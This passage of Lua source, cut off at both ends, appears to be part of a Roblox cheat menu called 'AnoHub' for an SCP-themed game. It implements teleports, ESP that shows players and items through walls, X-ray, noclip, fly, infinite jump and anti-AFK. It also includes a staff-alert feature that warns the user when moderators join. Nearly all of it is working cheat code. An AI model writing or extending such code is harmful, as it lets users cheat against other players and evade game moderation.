            if not hrp then Library:Notify("No HRP") return end
            hrp.CFrame = CFrame.new(Vector3.new(coordX, coordY, coordZ) + Vector3.new(0, 3, 0))
            statsCounter.teleports = statsCounter.teleports + 1
            Library:Notify("TP to (" .. coordX .. ", " .. coordY .. ", " .. coordZ .. ")")
        end,
    })
    CoordGroup:AddButton({
        Text = "Fill From Current Position",
        Tooltip = "Fill fields with current coordinates",
        Func = function()
            local ch = LocalPlayer.Character
            if not ch then return end
            local hrp = ch:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            coordX = math.floor(hrp.Position.X)
            coordY = math.floor(hrp.Position.Y)
            coordZ = math.floor(hrp.Position.Z)
            Library:Notify(string.format("Filled: %d, %d, %d", coordX, coordY, coordZ))
        end,
    })

    local CustomGroup = TeleportsTab:AddRightGroupbox("My Locations")
    local POINTS_FILE = _G.POINTS_FILE
    pcall(function()
        if readfile and isfile and isfile(POINTS_FILE) then
            local data = readfile(POINTS_FILE)
            if data and data ~= "" then
                local ok, parsed = pcall(function() return _G.HttpService:JSONDecode(data) end)
                if ok and type(parsed) == "table" then _G.customPoints = parsed end
            end
        end
    end)

    local function savePoints()
        pcall(function()
            if writefile then writefile(POINTS_FILE, _G.HttpService:JSONEncode(_G.customPoints)) end
        end)
    end
    _G.savePoints = savePoints

    local pointListLabel = CustomGroup:AddLabel("Total: " .. tostring(#_G.customPoints))
    local function refreshPointUI() pointListLabel:SetText("Total: " .. tostring(#_G.customPoints)) end

    local savedPointsButtons = {}
    local function rebuildPointsList()
        for _, obj in pairs(savedPointsButtons) do
            if obj and obj.Destroy then obj:Destroy() end
        end
        savedPointsButtons = {}
        local sortedNames = {}
        for name, _ in pairs(_G.customPoints) do table.insert(sortedNames, name) end
        table.sort(sortedNames)
        for _, name in ipairs(sortedNames) do
            local btn = CustomGroup:AddButton({
                Text = name,
                Tooltip = "Teleport to " .. name,
                Func = function()
                    local pt = _G.customPoints[name]
                    if not pt then return end
                    local ch = LocalPlayer.Character
                    if not ch then return end
                    local hrp = ch:FindFirstChild("HumanoidRootPart")
                    if not hrp then return end
                    hrp.CFrame = CFrame.new(Vector3.new(pt.X, pt.Y, pt.Z) + Vector3.new(0, 3, 0))
                    statsCounter.teleports = statsCounter.teleports + 1
                    Library:Notify("Teleported to " .. name)
                end,
            })
            table.insert(savedPointsButtons, btn)
        end
    end
    _G.rebuildPointsList = rebuildPointsList

    local newPointName = "Point_" .. tostring(#_G.customPoints + 1)
    CustomGroup:AddInput("NewPointName", {
        Text = "New Point Name", Default = newPointName, Placeholder = "Name...",
        Numeric = false, Finished = false,
        Tooltip = "Name for new point",
        Callback = function(v) newPointName = v end,
    })

    CustomGroup:AddButton({
        Text = "Save Current Position",
        Tooltip = "Save current position as point",
        Func = function()
            local ch = LocalPlayer.Character
            if not ch then Library:Notify("No character") return end
            local hrp = ch:FindFirstChild("HumanoidRootPart")
            if not hrp then Library:Notify("No HRP") return end
            local name = newPointName
            if not name or name == "" then name = "Point_" .. tostring(#_G.customPoints + 1) end
            if _G.customPoints[name] then name = name .. "_" .. tostring(math.random(100, 999)) end
            _G.customPoints[name] = { X = hrp.Position.X, Y = hrp.Position.Y, Z = hrp.Position.Z }
            savePoints()
            refreshPointUI()
            rebuildPointsList()
            Library:Notify("Saved: " .. name)
        end,
    })
    CustomGroup:AddButton({
        Text = "Delete Last Point",
        Tooltip = "Delete last saved point",
        Func = function()
            local lastName = nil
            for name, _ in pairs(_G.customPoints) do lastName = name end
            if lastName then
                _G.customPoints[lastName] = nil
                savePoints()
                refreshPointUI()
                rebuildPointsList()
                Library:Notify("Deleted: " .. lastName)
            end
        end,
    })
    CustomGroup:AddButton({
        Text = "Clear All Points",
        Tooltip = "Delete all saved points",
        Func = function()
            _G.customPoints = {}
            savePoints()
            refreshPointUI()
            rebuildPointsList()
            Library:Notify("All points cleared")
        end,
    })

    local RenameGroup = TeleportsTab:AddRightGroupbox("Rename Point")
    local renameOld, renameNew = "", ""
    RenameGroup:AddInput("RenameOld", { Text = "Old name", Default = "", Placeholder = "Point_1", Numeric = false, Finished = false, Tooltip = "Old point name", Callback = function(v) renameOld = v end })
    RenameGroup:AddInput("RenameNew", { Text = "New name", Default = "", Placeholder = "Base", Numeric = false, Finished = false, Tooltip = "New point name", Callback = function(v) renameNew = v end })
    RenameGroup:AddButton({
        Text = "Rename",
        Tooltip = "Rename point",
        Func = function()
            if not renameOld or not renameNew or renameOld == "" or renameNew == "" then Library:Notify("Fill both fields") return end
            if not _G.customPoints[renameOld] then Library:Notify("Point not found: " .. renameOld) return end
            _G.customPoints[renameNew] = _G.customPoints[renameOld]
            _G.customPoints[renameOld] = nil
            savePoints()
            refreshPointUI()
            rebuildPointsList()
            Library:Notify("Renamed " .. renameOld .. " to " .. renameNew)
        end,
    })

    rebuildPointsList()

    local VisualTab = Tabs.Visual
    local ESPGroup = VisualTab:AddLeftGroupbox("Player ESP")

    ESPGroup:AddToggle("PlayerESP", {
        Text = "Player ESP", Default = false,
        Tooltip = "Shows players through walls",
        Callback = function(Value)
            _G.espActive = Value
            if _G.espActive then
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer
                        and not (_G.ESPBlacklist and _G.ESPBlacklist[plr.UserId])
                        and not (_G.isHiddenDev and _G.isHiddenDev(plr))
                        and _G.isRoleVisible(plr) then
                        _G.createPlayerESP(plr)
                    end
                end
            else
                _G.espCleanup()
            end
        end,
    })

    ESPGroup:AddToggle("NPCESP", {
        Text = "NPC ESP", Default = false,
        Tooltip = "Highlights NPCs",
        Callback = function(Value)
            _G.npcESPActive = Value
            if Value then
                _G.initialNPCScan()
            else
                for model, _ in pairs(npcESPObjects) do
                    pcall(function() _G.removeNPCESP(model) end)
                end
                _G.npcESPObjects = {}
                for _, obj in pairs(Workspace:GetDescendants()) do
                    if obj:IsA("Highlight") and obj.Name == "AnoHubNPC_HL" then
                        pcall(function() obj:Destroy() end)
                    end
                end
            end
        end,
    })

    ESPGroup:AddDivider()
    ESPGroup:AddToggle("ESPName", { Text = "Show Name", Default = true, Tooltip = "Show player name", Callback = function(Value) _G.espOptions.name = Value end })
    ESPGroup:AddToggle("ESPRole", { Text = "Show Role", Default = true, Tooltip = "Show player role", Callback = function(Value) _G.espOptions.role = Value end })
    ESPGroup:AddToggle("ESPHealth", { Text = "Show Health", Default = true, Tooltip = "Show HP bar", Callback = function(Value) _G.espOptions.health = Value end })
    ESPGroup:AddToggle("ESPRank", { Text = "Show Rank", Default = true, Tooltip = "Show staff/VIP tag", Callback = function(Value) _G.espOptions.rank = Value end })
    ESPGroup:AddToggle("ESPTags", { Text = "Show Tags", Default = true, Tooltip = "Show tags", Callback = function(Value) _G.espOptions.tags = Value end })
    ESPGroup:AddToggle("ESPDistance", { Text = "Show Distance", Default = false, Tooltip = "Show distance", Callback = function(Value) _G.espOptions.distance = Value end })
    ESPGroup:AddToggle("ESPHighlight", { Text = "Highlight", Default = true, Tooltip = "Highlight model", Callback = function(Value) _G.espOptions.highlight = Value end })

    ESPGroup:AddDivider()
    _G.CreateRainbowToggle = function()
        if _G.rainbowToggleCreated then return end
        _G.rainbowToggleCreated = true
        ESPGroup:AddToggle("RainbowHighlight", {
            Text = "Rainbow Highlight (Secret)", Default = false,
            Tooltip = "Cycles colors",
            Callback = function(Value) _G.rainbowHighlightActive = Value end,
        })
    end

    ESPGroup:AddDivider()
    ESPGroup:AddLabel("Role Filter")
    ESPGroup:AddToggle("RoleDClass", { Text = "D-Class", Default = true, Tooltip = "Show D-Class", Callback = function(Value) roleFilter.d_class = Value end })
    ESPGroup:AddToggle("RoleScientist", { Text = "Scientist", Default = true, Tooltip = "Show Scientist", Callback = function(Value) roleFilter.scientist = Value end })
    ESPGroup:AddToggle("RoleSecurity", { Text = "Security", Default = true, Tooltip = "Show Security", Callback = function(Value) roleFilter.security = Value end })
    ESPGroup:AddToggle("RoleMTF", { Text = "MTF", Default = true, Tooltip = "Show MTF", Callback = function(Value) roleFilter.mtf = Value end })
    ESPGroup:AddToggle("RoleChaos", { Text = "Chaos", Default = true, Tooltip = "Show Chaos", Callback = function(Value) roleFilter.chaos_insurgency = Value end })
    ESPGroup:AddToggle("RoleDirector", { Text = "Director", Default = true, Tooltip = "Show Director", Callback = function(Value) roleFilter.director = Value end })
    ESPGroup:AddToggle("RoleAnomaly", { Text = "Anomaly", Default = true, Tooltip = "Show Anomaly", Callback = function(Value) roleFilter.anomaly = Value end })
    ESPGroup:AddToggle("RoleNeutral", { Text = "Neutral", Default = true, Tooltip = "Show Neutral", Callback = function(Value) roleFilter.neutral = Value end })

    local WorldGroup = VisualTab:AddLeftGroupbox("World")
    WorldGroup:AddToggle("XRay", {
        Text = "X-Ray", Default = false,
        Tooltip = "Walls semi-transparent",
        Callback = function(Value)
            _G.xrayActive = Value
            if _G.xrayActive then
                local function xrayFunc()
                    for _, v in pairs(Workspace:GetDescendants()) do
                        if v:IsA("BasePart") then v.LocalTransparencyModifier = 0.5 end
                    end
                end
                xrayFunc()
                _G.xrayLoop = RunService.Heartbeat:Connect(xrayFunc)
            else
                if _G.xrayLoop then _G.xrayLoop:Disconnect() _G.xrayLoop = nil end
                for _, v in pairs(Workspace:GetDescendants()) do
                    if v:IsA("BasePart") then v.LocalTransparencyModifier = 0 end
                end
            end
        end,
    })

    WorldGroup:AddToggle("Fullbright", {
        Text = "Fullbright", Default = false,
        Tooltip = "Bright day",
        Callback = function(Value)
            if Value then
                game:GetService("Lighting").Brightness = 3
                game:GetService("Lighting").ClockTime = 12
                game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(200,200,200)
                game:GetService("Lighting").Ambient = Color3.fromRGB(200,200,200)
            else
                game:GetService("Lighting").Brightness = 2
                game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128,128,128)
                game:GetService("Lighting").Ambient = Color3.fromRGB(70,70,70)
            end
        end,
    })

    WorldGroup:AddToggle("NoFog", {
        Text = "No Fog", Default = false,
        Tooltip = "Removes fog",
        Callback = function(Value)
            if Value then
                game:GetService("Lighting").FogEnd = 100000
                game:GetService("Lighting").FogStart = 100000
                for _, atmo in pairs(game:GetService("Lighting"):GetChildren()) do
                    if atmo:IsA("Atmosphere") then atmo.Density = 0 end
                end
            else
                game:GetService("Lighting").FogEnd = 100000
                game:GetService("Lighting").FogStart = 0
            end
        end,
    })

    WorldGroup:AddToggle("LowGraphics", {
        Text = "Low Graphics", Default = false,
        Tooltip = "Disables shadows, effects",
        Callback = function(Value)
            _G.lowGraphicsActive = Value
            if Value then
                if _G.lowGraphicsBackup then Library:Notify("Low Graphics already active", 5) return end
                _G.lowGraphicsBackup = {
                    Lighting = {
                        Brightness = game:GetService("Lighting").Brightness,
                        ClockTime = game:GetService("Lighting").ClockTime,
                        GlobalShadows = game:GetService("Lighting").GlobalShadows,
                        FogEnd = game:GetService("Lighting").FogEnd,
                        FogStart = game:GetService("Lighting").FogStart,
                    },
                    QualityLevel = settings().Rendering.QualityLevel,
                }
                local Terrain = workspace:FindFirstChildWhichIsA("Terrain")
                if Terrain then
                    _G.lowGraphicsBackup.Terrain = {
                        WaterWaveSize = Terrain.WaterWaveSize,
                        WaterWaveSpeed = Terrain.WaterWaveSpeed,
                        WaterReflectance = Terrain.WaterReflectance,
                        WaterTransparency = Terrain.WaterTransparency,
                    }
                    Terrain.WaterWaveSize = 0
                    Terrain.WaterWaveSpeed = 0
                    Terrain.WaterReflectance = 0
                    Terrain.WaterTransparency = 1
                end
                game:GetService("Lighting").GlobalShadows = false
                game:GetService("Lighting").FogEnd = 9e9
                game:GetService("Lighting").FogStart = 9e9
                for _, v in pairs(game:GetService("Lighting"):GetDescendants()) do
                    if v:IsA("PostEffect") then v.Enabled = false end
                end
                pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
                _G.lowGraphicsConn = workspace.DescendantAdded:Connect(function(child)
                    if not _G.lowGraphicsActive then return end
                    task.spawn(function()
                        if child:IsA("ForceField") or child:IsA("Sparkles") or child:IsA("Smoke") or child:IsA("Fire") or child:IsA("Beam") then
                            RunService.Heartbeat:Wait()
                            child:Destroy()
                        elseif child:IsA("BasePart") then child.CastShadow = false
                        elseif child:IsA("Decal") then child.Transparency = 1 end
                    end)
                end)
                Library:Notify("Low Graphics enabled", 5)
            else
                if _G.lowGraphicsBackup then
                    local b = _G.lowGraphicsBackup
                    if b.Lighting then
                        game:GetService("Lighting").Brightness = b.Lighting.Brightness
                        game:GetService("Lighting").ClockTime = b.Lighting.ClockTime
                        game:GetService("Lighting").GlobalShadows = b.Lighting.GlobalShadows
                        game:GetService("Lighting").FogEnd = b.Lighting.FogEnd
                        game:GetService("Lighting").FogStart = b.Lighting.FogStart
                    end
                    if b.QualityLevel then pcall(function() settings().Rendering.QualityLevel = b.QualityLevel end) end
                    if b.Terrain then
                        local Terrain = workspace:FindFirstChildWhichIsA("Terrain")
                        if Terrain then
                            Terrain.WaterWaveSize = b.Terrain.WaterWaveSize
                            Terrain.WaterWaveSpeed = b.Terrain.WaterWaveSpeed
                            Terrain.WaterReflectance = b.Terrain.WaterReflectance
                            Terrain.WaterTransparency = b.Terrain.WaterTransparency
                        end
                    end
                    _G.lowGraphicsBackup = nil
                end
                if _G.lowGraphicsConn then _G.lowGraphicsConn:Disconnect() _G.lowGraphicsConn = nil end
                Library:Notify("Low Graphics disabled", 5)
            end
        end,
    })
	    local PartESPGroup = VisualTab:AddRightGroupbox("Part ESP")
    local partESPActive = false
    local partESPObjects = {}
    local partESPFilter = {}

    local function partESPAdd(name)
        if not name or name == "" then return end
        name = tostring(name)
        for _, existing in ipairs(partESPFilter) do
            if existing:lower() == name:lower() then return end
        end
        table.insert(partESPFilter, name)
        Library:Notify("Part ESP: added " .. name, 4)
    end
    local function partESPRemove(name)
        if not name or name == "" then return end
        for i, existing in ipairs(partESPFilter) do
            if existing:lower() == tostring(name):lower() then
                table.remove(partESPFilter, i)
                Library:Notify("Part ESP: removed " .. name, 4)
                return
            end
        end
    end
    local function partESPClear()
        partESPFilter = {}
        Library:Notify("Part ESP: filter cleared", 4)
    end
    local function partESPMatches(name)
        if #partESPFilter == 0 then return false end
        local n = name:lower()
        for _, filter in ipairs(partESPFilter) do
            if n == filter:lower() then return true end
        end
        return false
    end
    local function partESPRemoveObject(part)
        local data = partESPObjects[part]
        if not data then return end
        if data.HL then data.HL:Destroy() end
        if data.BB then data.BB:Destroy() end
        partESPObjects[part] = nil
    end
    local function partESPCreate(part)
        if partESPObjects[part] then return end
        if not partESPMatches(part.Name) then return end
        if not (part:IsA("BasePart") or part:IsA("Model")) then return end
        if part:IsA("Model") and not part.PrimaryPart and not part:FindFirstChildWhichIsA("BasePart", true) then return end

        local hl = Instance.new("Highlight")
        hl.Parent = part
        hl.FillColor = Color3.fromRGB(215, 110, 0)
        hl.FillTransparency = 0.5
        hl.OutlineColor = Color3.fromRGB(215, 110, 0)
        hl.OutlineTransparency = 0
        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        if part:IsA("Model") then hl.Adornee = part end

        local attachPart = part
        if part:IsA("Model") then
            attachPart = part.PrimaryPart or part:FindFirstChildWhichIsA("BasePart", true)
        end
        if not attachPart then return end

        local bb = Instance.new("BillboardGui")
        bb.Size = UDim2.new(0, 150, 0, 20)
        bb.StudsOffset = Vector3.new(0, 3.5, 0)
        bb.AlwaysOnTop = true
        bb.Parent = attachPart

        local nl = Instance.new("TextLabel")
        nl.Size = UDim2.new(1,0,1,0)
        nl.BackgroundTransparency = 1
        nl.Text = part.Name
        nl.TextColor3 = Color3.fromRGB(215, 110, 0)
        nl.TextSize = 12
        nl.Font = Enum.Font.GothamBold
        nl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
        nl.TextStrokeTransparency = 0.4
        nl.Parent = bb

        partESPObjects[part] = { HL = hl, BB = bb }
    end
    local function partESPFullScan()
        local currentParts = {}
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") or obj:IsA("Model") then
                if partESPMatches(obj.Name) then
                    currentParts[obj] = true
                    partESPCreate(obj)
                end
            end
        end
        for part, _ in pairs(partESPObjects) do
            if not currentParts[part] or not part.Parent then partESPRemoveObject(part) end
        end
    end
    _G.partESPFullScan = partESPFullScan

    Workspace.DescendantAdded:Connect(function(obj)
        if not partESPActive then return end
        if obj:IsA("BasePart") or obj:IsA("Model") then
            task.wait(0.1)
            if partESPMatches(obj.Name) then partESPCreate(obj) end
        end
    end)
    Workspace.DescendantRemoving:Connect(function(obj)
        if partESPObjects[obj] then partESPRemoveObject(obj) end
    end)

    PartESPGroup:AddToggle("PartESPToggle", {
        Text = "Part ESP", Default = false,
        Tooltip = "Highlights objects by name",
        Callback = function(Value)
            partESPActive = Value
            if Value then
                partESPFullScan()
                Library:Notify("Part ESP enabled", 5)
            else
                for part, _ in pairs(partESPObjects) do partESPRemoveObject(part) end
                partESPObjects = {}
                Library:Notify("Part ESP disabled", 5)
            end
        end,
    })
    PartESPGroup:AddInput("PartESPAdd", {
        Text = "Add Part Name", Default = "", Placeholder = "Escape",
        Numeric = false, Finished = true,
        Tooltip = "Enter object name",
        Callback = function(Value)
            if Value and Value ~= "" then
                partESPAdd(Value)
                if partESPActive then partESPFullScan() end
            end
        end,
    })
    PartESPGroup:AddInput("PartESPRemove", {
        Text = "Remove Part Name", Default = "", Placeholder = "Escape",
        Numeric = false, Finished = true,
        Tooltip = "Remove object from filter",
        Callback = function(Value)
            if Value and Value ~= "" then
                partESPRemove(Value)
                if partESPActive then partESPFullScan() end
            end
        end,
    })
    PartESPGroup:AddButton({ Text = "Clear Filter", Tooltip = "Clear entire filter", Func = function() partESPClear() if partESPActive then partESPFullScan() end end })
    PartESPGroup:AddButton({
        Text = "Re-scan Now",
        Tooltip = "Rescan world",
        Func = function() if partESPActive then partESPFullScan() Library:Notify("Part ESP: rescan done", 4) end end,
    })
    PartESPGroup:AddDivider()
    local partESPListLabel = PartESPGroup:AddLabel("Filter: (empty)")
    local function updatePartESPList()
        if #partESPFilter == 0 then partESPListLabel:SetText("Filter: (empty)")
        else partESPListLabel:SetText("Filter: " .. table.concat(partESPFilter, ", ")) end
    end
    task.spawn(function() while task.wait(2) do pcall(updatePartESPList) end end)
    updatePartESPList()

    local ItemsGroup = VisualTab:AddRightGroupbox("Items ESP")
    ItemsGroup:AddToggle("ItemsESP", {
        Text = "Items ESP", Default = false,
        Tooltip = "Highlights items on map",
        Callback = function(Value)
            _G.itemsESP = Value
            if _G.itemsESP then startItemsESP() else stopItemsESP() end
        end,
    })
    ItemsGroup:AddDivider()
    for key, item in pairs(items) do
        ItemsGroup:AddToggle("IF_" .. key, {
            Text = item.Name, Default = item.Enabled,
            Tooltip = "Show " .. item.Name,
            Callback = function(Value)
                item.Enabled = Value
                if itemsESPActive then updateItemsCache() updateItemsHL() end
            end,
        })
    end

    local NotifyGroup = VisualTab:AddRightGroupbox("Notifications")
    NotifyGroup:AddToggle("ChatNotify", {
        Text = "Joined/Left Notification", Default = false,
        Tooltip = "Notify when player joins/leaves",
        Callback = function(Value) _G.chatNotifyEnabled = Value end,
    })
    Players.PlayerAdded:Connect(function(plr)
        task.wait(0.5)
        if _G.isHiddenDev and _G.isHiddenDev(plr) then return end
        if _G.chatNotifyEnabled then Library:Notify("JOINED: " .. plr.Name, 5) end
    end)
    Players.PlayerRemoving:Connect(function(plr)
        if _G.chatNotifyEnabled then Library:Notify("LEFT: " .. plr.Name, 5) end
    end)

    local StaffGroup = VisualTab:AddRightGroupbox("Staff Alert")
    StaffGroup:AddToggle("StaffAlertToggle", {
        Text = "Staff Alert", Default = true,
        Tooltip = "Notify when staff joins",
        Callback = function(Value) _G.staffAlertActive = Value end,
    })
    StaffGroup:AddToggle("StaffTag", {
        Text = "Staff Tag in ESP", Default = true,
        Tooltip = "Show [STAFF]/[CREATOR] tag",
        Callback = function(Value)
            _G.staffTagEnabled = Value
            if _G.espActive and _G.buildESPText then
                for plr, data in pairs(espObjs) do
                    if data.NameLabel then
                        data.NameLabel.Text = _G.buildESPText(plr)
                        data.NameLabel.TextColor3 = _G.getDisplayRoleColor(plr)
                    end
                end
            end
        end,
    })
    StaffGroup:AddButton({
        Text = "Check Staff Now",
        Tooltip = "Check staff on server",
        Func = function()
            local found = 0
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and _G.isStaff(plr) then
                    local role = _G.getStaffRoleName(plr) or "Staff"
                    Library:Notify(role .. ": " .. plr.Name, 10)
                    found = found + 1
                end
            end
            if found == 0 then Library:Notify("No staff online") end
        end,
    })
    StaffGroup:AddButton({
        Text = "Reload Staff List",
        Tooltip = "Reload staff list",
        Func = function()
            _G.loadStaffIds()
            _G.groupRoleCache = {}
            Library:Notify("Staff list reloaded: " .. tostring(#_G.staffIds))
        end,
    })

    local RoleAlertGroup = VisualTab:AddRightGroupbox("Role Alert")
    RoleAlertGroup:AddLabel("Notify when these roles appear:")
    RoleAlertGroup:AddToggle("RAListDClass", { Text = "D-Class", Default = false, Tooltip = "Notify on D-Class join", Callback = function(v) roleAlertFilter.d_class = v end })
    RoleAlertGroup:AddToggle("RAScientist", { Text = "Scientist", Default = false, Tooltip = "Notify on Scientist join", Callback = function(v) roleAlertFilter.scientist = v end })
    RoleAlertGroup:AddToggle("RASecurity", { Text = "Security", Default = false, Tooltip = "Notify on Security join", Callback = function(v) roleAlertFilter.security = v end })
    RoleAlertGroup:AddToggle("RAMTF", { Text = "MTF", Default = false, Tooltip = "Notify on MTF join", Callback = function(v) roleAlertFilter.mtf = v end })
    RoleAlertGroup:AddToggle("RAChaos", { Text = "Chaos", Default = false, Tooltip = "Notify on Chaos join", Callback = function(v) roleAlertFilter.chaos_insurgency = v end })
    RoleAlertGroup:AddToggle("RADirector", { Text = "Director", Default = false, Tooltip = "Notify on Director join", Callback = function(v) roleAlertFilter.director = v end })
    RoleAlertGroup:AddToggle("RAAnomaly", { Text = "Anomaly", Default = false, Tooltip = "Notify on Anomaly join", Callback = function(v) roleAlertFilter.anomaly = v end })
    RoleAlertGroup:AddToggle("RANeutral", { Text = "Neutral", Default = false, Tooltip = "Notify on Neutral join", Callback = function(v) roleAlertFilter.neutral = v end })
    RoleAlertGroup:AddButton({
        Text = "Reset Role Alerted",
        Tooltip = "Reset role alert cache",
        Func = function()
            _G.roleAlerted = {}
            Library:Notify("Role Alert cache cleared")
        end,
    })
end

print("[AnoHub] Part 3/4 loaded")
do
    local Library = _G.Library
    local Tabs = _G.Tabs
    local Players = _G.Players
    local LocalPlayer = _G.LocalPlayer
    local RunService = _G.RunService
    local UserInputService = _G.UserInputService
    local StarterGui = _G.StarterGui
    local Camera = _G.Camera
    local HttpService = _G.HttpService
    local statsCounter = _G.statsCounter
    local items = _G.items
    local roleAlertFilter = _G.roleAlertFilter
    local staffNotified = _G.staffNotified
    local SaveManager = _G.SaveManager
    local ThemeManager = _G.ThemeManager
    local Workspace = _G.Workspace

    local MiscTab = Tabs.Misc
    local MiscLeft = MiscTab:AddLeftGroupbox("Movement")

    MiscLeft:AddToggle("Noclip", {
        Text = "Noclip", Default = false,
        Tooltip = "Walk through walls",
        Callback = function(Value)
            _G.noclipActive = Value
            if _G.noclipActive then
                statsCounter.noclipsActivated = statsCounter.noclipsActivated + 1
                if _G.noclipConn then _G.noclipConn:Disconnect() end
                _G.noclipConn = RunService.Stepped:Connect(function()
                    local char = LocalPlayer.Character
                    if char then
                        for _, part in pairs(char:GetDescendants()) do
                            if part:IsA("BasePart") and part.CanCollide then part.CanCollide = false end
                        end
                    end
                end)
            else
                if _G.noclipConn then _G.noclipConn:Disconnect() _G.noclipConn = nil end
                local char = LocalPlayer.Character
                if char then
                    for _, part in pairs(char:GetDescendants()) do
                        if part:IsA("BasePart") then part.CanCollide = true end
                    end
                end
            end
        end,
    })

    local swimActive = false
    local swimConn = nil
    local swimBV = nil
    local swimAnimTrack = nil
    local swimOldGravity = workspace.Gravity
    local swimDiedConn = nil

    local function stopSwim()
        if not swimActive then return end
        swimActive = false
        _G.swimActive = false
        workspace.Gravity = swimOldGravity or 196.2
        if swimConn then swimConn:Disconnect() swimConn = nil end
        if swimDiedConn then swimDiedConn:Disconnect() swimDiedConn = nil end
        local ch = LocalPlayer.Character
        if ch then
            local hrp = ch:FindFirstChild("HumanoidRootPart")
            if hrp then
                local bv = hrp:FindFirstChild("AnoHubSwim")
                if bv then bv:Destroy() end
            end
            local hum = ch:FindFirstChildWhichIsA("Humanoid")
            if hum then
                local enums = Enum.HumanoidStateType:GetEnumItems()
                for _, v in pairs(enums) do
                    if v ~= Enum.HumanoidStateType.None then
                        pcall(function() hum:SetStateEnabled(v, true) end)
                    end
                end
                pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
            end
        end
        swimBV = nil
        if swimAnimTrack then
            pcall(function() swimAnimTrack:Stop() end)
            swimAnimTrack = nil
        end
    end

    local function startSwim()
        if swimActive then return end
        if _G.flyActive then return end
        local ch = LocalPlayer.Character
        if not ch then return end
        local hum = ch:FindFirstChildWhichIsA("Humanoid")
        local hrp = ch:FindFirstChild("HumanoidRootPart")
        if not hum or not hrp then return end
        swimOldGravity = workspace.Gravity
        workspace.Gravity = 0
        swimBV = Instance.new("BodyVelocity")
        swimBV.Name = "AnoHubSwim"
        swimBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        swimBV.Velocity = Vector3.new(0, 0, 0)
        swimBV.Parent = hrp
        pcall(function()
            local anim = Instance.new("Animation")
            anim.AnimationId = "rbxassetid://143696951"
            local animator = hum:FindFirstChildOfClass("Animator") or hum
            swimAnimTrack = animator:LoadAnimation(anim)
            swimAnimTrack.Priority = Enum.AnimationPriority.Movement
            swimAnimTrack.Looped = true
            swimAnimTrack:Play()
        end)
        pcall(function()
            hum:SetStateEnabled(Enum.HumanoidStateType.Swimming, true)
            hum:ChangeState(Enum.HumanoidStateType.Swimming)
        end)
        local enums = Enum.HumanoidStateType:GetEnumItems()
        for _, v in pairs(enums) do
            if v ~= Enum.HumanoidStateType.None and v ~= Enum.HumanoidStateType.Swimming then
                pcall(function() hum:SetStateEnabled(v, false) end)
            end
        end
        swimActive = true
        _G.swimActive = true
        swimConn = RunService.RenderStepped:Connect(function()
            if not swimActive then return end
            local c = LocalPlayer.Character
            if not c then return end
            local h = c:FindFirstChildWhichIsA("Humanoid")
            local root = c:FindFirstChild("HumanoidRootPart")
            if not h or not root then return end
            local bv = root:FindFirstChild("AnoHubSwim")
            if not bv then
                bv = Instance.new("BodyVelocity")
                bv.Name = "AnoHubSwim"
                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bv.Parent = root
                swimBV = bv
            end
            local cam = workspace.CurrentCamera
            local moveDir = Vector3.new(0, 0, 0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then moveDir = moveDir - Vector3.new(0, 1, 0) end
            local horizontal = Vector3.new(moveDir.X, 0, moveDir.Z)
            if horizontal.Magnitude > 0 then horizontal = horizontal.Unit * 50 end
            local vertical = moveDir.Y * 30
            bv.Velocity = Vector3.new(horizontal.X, vertical, horizontal.Z)
        end)
        swimDiedConn = hum.Died:Connect(function()
            stopSwim()
            pcall(function()
                local toggle = Library.Toggles and Library.Toggles["Swim"]
                if toggle then toggle:SetValue(false) end
            end)
        end)
    end

    MiscLeft:AddToggle("Swim", {
        Text = "Swim",
        Default = false,
        Tooltip = "Swim in the air (Space = up, Ctrl = down, WASD = move)",
        Callback = function(Value)
            if Value then
                startSwim()
                Library:Notify("Swim enabled (Space = up, Ctrl = down)", 3)
            else
                stopSwim()
            end
        end,
    })

    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        if swimActive then
            stopSwim()
            task.wait(0.2)
            startSwim()
        end
    end)

    MiscLeft:AddToggle("AntiAFK", {
        Text = "Anti-AFK", Default = false,
        Tooltip = "Prevents idle kick",
        Callback = function(Value)
            _G.antiAfkActive = Value
            if _G.antiAfkActive then
                if _G.antiAfkConn then _G.antiAfkConn:Disconnect() end
                _G.antiAfkConn = RunService.Heartbeat:Connect(function()
                    local vu = game:GetService("VirtualUser")
                    if vu then vu:CaptureController() vu:ClickButton2(Vector2.new()) end
                end)
            else
                if _G.antiAfkConn then _G.antiAfkConn:Disconnect() _G.antiAfkConn = nil end
            end
        end,
    })

    MiscLeft:AddToggle("InfiniteJump", {
        Text = "Infinite Jump", Default = false,
        Tooltip = "Infinite jump (hold Space)",
        Callback = function(Value) _G.infiniteJumpActive = Value end,
    })

    MiscLeft:AddSlider("FlySpeed", {
        Text = "Fly Speed", Default = 60, Min = 20, Max = 200, Rounding = 0,
        Tooltip = "Fly speed",
        Callback = function(Value) _G.flySpeed = Value end,
    })

    MiscLeft:AddToggle("Fly", {
        Text = "Fly", Default = false,
        Tooltip = "Fly (WASD to move, Space/Ctrl up/down)",
        Callback = function(Value)
            _G.flyActive = Value
            if Value then
                if swimActive then
                    stopSwim()
                    pcall(function()
                        local st = Library.Toggles and Library.Toggles["Swim"]
                        if st then st:SetValue(false) end
                    end)
                end
                local ch = LocalPlayer.Character
                if not ch then return end
                local hrp = ch:FindFirstChild("HumanoidRootPart")
                if not hrp then return end
